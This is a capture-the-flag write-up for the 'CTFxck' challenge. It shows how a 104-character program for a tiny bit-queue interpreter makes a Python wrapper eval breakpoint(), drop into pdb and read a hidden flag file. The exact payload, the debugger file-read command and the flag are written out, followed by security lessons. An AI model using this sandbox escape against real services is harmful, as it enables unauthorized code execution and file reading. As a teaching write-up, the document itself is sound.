# CTFxck

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Miscellaneous |
| Difficulty | Baby |
| Points | 485 (dynamic) |
| Author | xzhiyouu |
| Connection | `nc chal.thjcc.org 9002` |
| Interpreter | [`artifacts/main.rs`](artifacts/main.rs) |
| Protocol transcript | [`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{h4lt1ng_1s_4_c0ntr0l_fl0w_pr1m1t1v3}` |

## Overview

The service accepts a program written for the deliberately tiny CTFuck
interpreter. Input ends with a line containing `EOF`. The challenge wrapper
runs the interpreter and then evaluates the bytes it produced as Python code.
This creates a useful second stage, but two limits make it less direct than
simply printing a long Python payload:

```text
MAX_SRC   = 110
MAX_OUT   = 64
MAX_STEPS = 1048576
```

The source limit is the real obstacle. A direct program needs one instruction
to push each bit, one to output it, and one to remove it from the queue. Even
the compact Python expression `breakpoint()` is 12 bytes, so that approach
would require at least `12 * 8 * 3 = 288` CTFuck instructions.

The solution is to preload all 96 bits onto the interpreter's queue, then use a
single loop to output and pop its front element. When the last bit has been
removed, the output instruction tries to read an empty queue. The interpreter's
`unwrap!` macro handles that condition by breaking out of the execution loop.
In other words, the empty-queue error becomes our halt instruction.

The resulting 104-character CTFuck program prints `breakpoint()`. Python then
enters `pdb`, from which the flag file can be read directly.

## 1. Understanding the CTFuck VM

The challenge links to the interpreter at a specific Git commit. An exact copy
of that source and its MIT license are included in [`artifacts/`](artifacts/).
The language has only seven meaningful instructions:

| Instruction | Operation |
| --- | --- |
| `0` | Push a zero bit onto the queue |
| `1` | Push a one bit onto the queue |
| `:` | Duplicate the bit at the front of the queue |
| `$` | Remove the bit at the front of the queue |
| `,` | Read one input bit and append it to the queue |
| `.` | Copy the front bit into the output-byte buffer |
| `[x\|y]` | Jump to line `x` if the front bit is one, otherwise line `y` |

Bits are packed least-significant bit first. The relevant output code is:

```rust
Instr::Output => {
    self.out.push(*unwrap!(self.queue.get(0)));

    if self.out.1 >= 8 {
        // Write one completed byte.
    }
}
```

The custom `unwrap!` macro is equally important:

```rust
macro_rules! unwrap {
    ($q: expr) => {
        match $q {
            Some(x) => x,
            _ => break,
        }
    };
}
```

Unlike Rust's normal `unwrap`, an empty queue does not panic. It executes
`break`, terminating the interpreter loop cleanly.

Newlines define jump targets. During translation, line number `n` becomes the
instruction offset for the start of that source line. This lets a short second
line loop back to itself.

## 2. Mapping the Wrapper

Connecting to the service gives one prompt:

```text
>>>
```

The service collects lines until it receives `EOF`. Small experiments reveal
the outer wrapper's behavior:

- A source longer than 110 characters is rejected with `nope`.
- Syntactically invalid Python output is rejected with `nope`.
- Output such as `pass`, `True`, and `a=1` is accepted.
- Producing `help()` opens Python's interactive pydoc prompt.

A compact run-length CTFuck encoder can fit `help()` into the source limit.
Querying `__main__` through pydoc exposes the wrapper module name, functions,
and constants:

```text
FUNCTIONS
    interpret(prog, stdin=b'')
    main()
    parse_int(...)
    read_program()
    translate(...)

DATA
    MAX_OUT = 64
    MAX_SRC = 110
    MAX_STEPS = 1048576

FILE
    /app/chall.py
```

This confirms that CTFuck stdout is not the final response. It is consumed as
Python code by `/app/chall.py`. No flag value is present in the module globals,
so the next goal is an interactive Python primitive rather than another static
expression.

## 3. Choosing the Python Payload

Python's built-in breakpoint hook gives us an interactive debugger with only
12 bytes:

```python
breakpoint()
```

Other payloads that enumerate files or read a guessed path are longer and would
need a more complicated compressor. `breakpoint()` is short enough that all of
its bits can be stored literally while still leaving room for a shared output
loop.

The interpreter expects each byte least-significant bit first. For example,
the ASCII byte for `b` is `0x62`, whose transmitted bit order is:

```text
0 1 0 0 0 1 1 0
```

Applying the same conversion to all 12 bytes gives this 96-bit stream:

```text
010001100100111010100110100001101101011000001110111101101001011001110110001011100001010010010100
```

## 4. Compressing the Output Loop

Put the complete bit stream on line 1, followed by this seven-character second
line:

```text
.$[2|2]
```

The loop performs three actions:

1. `.` copies the queue's front bit into the output buffer.
2. `$` removes that bit.
3. `[2|2]` jumps back to line 2 whether the new front bit is zero or one.

After eight iterations, the output buffer flushes one byte. On the 96th
iteration, the VM emits the last bit and `$` removes it, leaving the queue
empty. The following conditional jump calls `queue.get(0)`, receives `None`,
and `unwrap!` breaks the interpreter loop.

The exact source is:

```text
010001100100111010100110100001101101011000001110111101101001011001110110001011100001010010010100
.$[2|2]
```

Its length is safely below the wrapper limit:

```text
96 bit pushes + 1 newline + 7 loop characters = 104 characters
```

The conditional jump inspects the new front bit only after `$` has removed the
old one. This ordering is what turns the empty queue into a clean exit after,
not before, the final payload bit has been emitted.

## 5. Entering the Python Debugger

Send the two-line program, terminate it with `EOF`, and wait for the debugger
prompt:

```text
--Return--
> <string>(1)<module>()->None
(Pdb)
```

At this point the Python process can inspect the challenge container. A shallow
filesystem search identifies the nonstandard flag location:

```text
/hereisasupersecretfile/flag.txt
```

The following Pdb command reads it:

```python
p open('/hereisasupersecretfile/flag.txt').read()
```

The service responds with:

```text
'THJCC{h4lt1ng_1s_4_c0ntr0l_fl0w_pr1m1t1v3}\n'
```

The complete successful exchange is preserved in
[`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt).

## 6. Automated Solver

The included [`solve.py`](solve.py) uses only Python's standard library. It:

1. Encodes `breakpoint()` as least-significant-bit-first bytes.
2. Appends the shared output loop.
3. Checks that the complete CTFuck program fits within 110 characters.
4. Sends the program and waits for the `(Pdb)` prompt.
5. Reads the flag file through a debugger command.
6. Extracts and prints the `THJCC{...}` value.

Run it from the challenge directory:

```bash
python3 solve.py
```

Expected output:

```text
program length: 104
flag: THJCC{h4lt1ng_1s_4_c0ntr0l_fl0w_pr1m1t1v3}
```

An alternative endpoint can be supplied positionally:

```bash
python3 solve.py chal.thjcc.org 9002
```

## Security Lessons

- Never execute output produced by an untrusted interpreter as code in a more
  powerful host language.
- Source-length restrictions do not form a security boundary. Loops and shared
  state can encode substantially more behavior than their character count
  suggests.
- Error and termination behavior are part of an instruction set. Here, an
  empty queue provides a useful control-flow primitive.
- Production Python services should disable interactive debugging hooks and run
  with a restricted environment even when an earlier sandbox layer exists.
- Sandboxes must be evaluated as complete compositions. A constrained language
  becomes dangerous when its output crosses into an unrestricted interpreter.

## Flag

```text
THJCC{h4lt1ng_1s_4_c0ntr0l_fl0w_pr1m1t1v3}
```
